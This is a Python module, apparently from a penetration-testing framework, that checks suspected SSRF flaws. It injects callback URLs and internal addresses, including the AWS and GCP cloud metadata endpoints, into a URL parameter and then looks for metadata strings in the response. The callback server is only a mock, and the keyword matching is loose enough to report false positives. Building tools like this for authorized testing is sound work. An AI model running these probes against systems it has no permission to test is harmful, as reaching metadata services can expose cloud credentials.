"""
SSRF PoC Validator

Validates SSRF using callback server.
"""
import logging
import asyncio
import uuid
from typing import Optional, Set
from datetime import datetime, timedelta

from app.validation.base_validator import BaseValidator, ValidationStatus, ValidationResult
from app.utils import PentestHTTPClient

logger = logging.getLogger(__name__)

class CallbackServer:
    """
    Simple callback server to detect SSRF

    Tracks incoming requests to unique URLs.
    """

    def __init__(self):
        self.callbacks: Set[str] = set()
        self.callback_data: dict = {}

    def generate_callback_url(self, identifier: str) -> str:
        """
        Generate unique callback URL

        For production, use actual callback server (e.g., Burp Collaborator, interact.sh)
        For now, we'll use a mock approach
        """
        # In real implementation, this would be your callback server
        # Example: f"http://callback.yourserver.com/{identifier}"

        # For demo/testing, we use a mock URL
        return f"http://127.0.0.1:9999/callback/{identifier}"

    def register_callback(self, identifier: str):
        """Register expected callback"""
        self.callbacks.add(identifier)
        self.callback_data[identifier] = {
            "registered_at": datetime.utcnow(),
            "received": False
        }

    def check_callback(self, identifier: str) -> bool:
        """Check if callback was received"""
        # In real implementation, this would check your callback server
        # For now, we return False (no callback server running)
        return self.callback_data.get(identifier, {}).get("received", False)

    def mark_received(self, identifier: str):
        """Mark callback as received (for testing)"""
        if identifier in self.callback_data:
            self.callback_data[identifier]["received"] = True


# Global callback server instance
_callback_server = CallbackServer()


class SSRFValidator(BaseValidator):
    """
    Validates SSRF vulnerabilities

    Uses callback URLs to detect out-of-band interactions.
    Falls back to response analysis.
    """

    INTERNAL_TARGETS = [
        "http://127.0.0.1",
        "http://localhost",
        "http://169.254.169.254",  # AWS metadata
        "http://metadata.google.internal",  # GCP metadata
    ]

    def _is_applicable(self, vulnerability: any) -> bool:
        """Check if SSRF validator applies"""
        vuln_category = getattr(vulnerability, 'category', '')
        if hasattr(vuln_category, 'value'):
            vuln_category = vuln_category.value

        return 'ssrf' in str(vuln_category).lower()

    async def validate(
        self,
        vulnerability: any,
        target_url: str,
        client: Optional[PentestHTTPClient] = None,
        **kwargs
    ) -> Optional[ValidationResult]:
        """
        Validate SSRF

        Args:
            vulnerability: Vulnerability object
            target_url: Base URL
            client: HTTP client
            **kwargs: Additional params

        Returns:
            ValidationResult with evidence
        """
        if not self._is_applicable(vulnerability):
            return None

        logger.info(f"🔍 Validating SSRF: {vulnerability.title}")

        if client is None:
            client = PentestHTTPClient(base_url=target_url)

        vuln_url = getattr(vulnerability, 'affected_url', target_url)
        vuln_param = getattr(vulnerability, 'affected_parameter', None)

        # Try callback-based validation
        callback_result = await self._validate_with_callback(client, vuln_url, vuln_param)
        if callback_result:
            return callback_result

        # Try response-based validation
        response_result = await self._validate_with_response(client, vuln_url, vuln_param)
        if response_result:
            return response_result

        # Could not confirm
        return self._create_result(
            status=ValidationStatus.UNCONFIRMED,
            confidence=0.3,
            evidence="Could not confirm SSRF",
            details={"reason": "No callback received and no internal data detected"}
        )

    async def _validate_with_callback(
        self,
        client: PentestHTTPClient,
        url: str,
        param: Optional[str]
    ) -> Optional[ValidationResult]:
        """
        Validate SSRF using callback server

        Note: Requires actual callback server for production.
        This is a framework - integrate with Burp Collaborator, interact.sh, etc.
        """
        # Generate unique identifier
        callback_id = str(uuid.uuid4())[:8]

        # Generate callback URL
        callback_url = _callback_server.generate_callback_url(callback_id)

        # Register expected callback
        _callback_server.register_callback(callback_id)

        logger.info(f"Testing SSRF with callback URL: {callback_url}")

        try:
            # Inject callback URL
            test_url = self._inject_payload(url, param, callback_url)

            # Send request
            await client.get(test_url)

            # Wait for callback (5 seconds)
            await asyncio.sleep(5)

            # Check if callback received
            if _callback_server.check_callback(callback_id):
                logger.info(f"✅ SSRF CONFIRMED: Callback received!")

                return self._create_result(
                    status=ValidationStatus.CONFIRMED,
                    confidence=1.0,
                    evidence=f"SSRF confirmed via callback to {callback_url}",
                    details={
                        "callback_url": callback_url,
                        "callback_id": callback_id,
                        "method": "callback_server"
                    }
                )

        except Exception as e:
            logger.debug(f"Callback validation failed: {e}")

        return None

    async def _validate_with_response(
        self,
        client: PentestHTTPClient,
        url: str,
        param: Optional[str]
    ) -> Optional[ValidationResult]:
        """
        Validate SSRF by checking response for internal data

        Tests access to internal endpoints and checks for leaked data.
        """
        for internal_target in self.INTERNAL_TARGETS:
            try:
                test_url = self._inject_payload(url, param, internal_target)

                response = await client.get(test_url)
                if not response:
                    continue

                content = response.text.lower()

                # Check for metadata service indicators
                ssrf_indicators = [
                    'ami-id',           # AWS
                    'instance-id',      # AWS
                    'metadata',         # AWS/GCP
                    'service-accounts', # GCP
                    'computemetadata',  # GCP
                    'azure',            # Azure
                    'localhost',
                    '127.0.0.1',
                ]

                for indicator in ssrf_indicators:
                    if indicator in content:
                        logger.info(f"✅ SSRF LIKELY: Internal data detected ({indicator})")

                        return self._create_result(
                            status=ValidationStatus.LIKELY,
                            confidence=0.80,
                            evidence=f"SSRF likely - response contains internal data: {indicator}",
                            details={
                                "target": internal_target,
                                "indicator": indicator,
                                "method": "response_analysis"
                            }
                        )

                # Check for localhost indicators
                if 'localhost' in content or '127.0.0.1' in content:
                    logger.info(f"✅ SSRF POSSIBLE: Localhost reference detected")

                    return self._create_result(
                        status=ValidationStatus.LIKELY,
                        confidence=0.65,
                        evidence="Possible SSRF - localhost reference in response",
                        details={
                            "target": internal_target,
                            "method": "response_analysis"
                        }
                    )

            except Exception as e:
                logger.debug(f"Response validation failed: {e}")
                continue

        return None

    def _inject_payload(self, url: str, param: Optional[str], payload: str) -> str:
        """Inject SSRF payload into URL"""
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote

        if not param:
            separator = '&' if '?' in url else '?'
            return f"{url}{separator}url={quote(payload)}"

        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)

        if param in query_params:
            query_params[param] = [payload]
        else:
            query_params[param] = [payload]

        new_query = urlencode(query_params, doseq=True)
        new_parsed = parsed._replace(query=new_query)

        return urlunparse(new_parsed)
